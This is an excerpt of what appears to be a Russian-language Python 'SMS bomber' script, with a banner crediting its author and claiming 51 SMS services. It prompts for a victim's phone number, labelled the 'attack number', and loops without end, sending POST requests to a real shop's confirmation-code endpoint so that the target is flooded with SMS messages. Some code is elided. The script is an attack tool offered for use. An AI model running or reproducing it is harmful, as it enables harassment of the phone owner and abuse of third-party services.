...
─────────────██▀─▀██─█──█───█
--------------------------------
[СМС-Бомбер от Ky43eRR8]

[СМС-Серисов: 51]

[Номер вводить ТОЛЬКО так: 79xxxxxxxxx" ("x" заменить на номер телефона)]

[Спасибо за использование! <3]
"""

print(banner)
_phone = input('Введите номер атаки (79xxxxxxxxx)-->> ')
...
while True:
	...
	try:
		...
		print('[-] Не отправлено!')
	try:
		requests.post('https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber=+' + _phone + '/')
		print('[+] Fundayshop отправлено!')
	except:
		print('[-] Не отправлено!')
	...
	try:
		iteration += 1
		print(('Круг {} пройден! Начинаю заного...').format(iteration))
	except:
		break
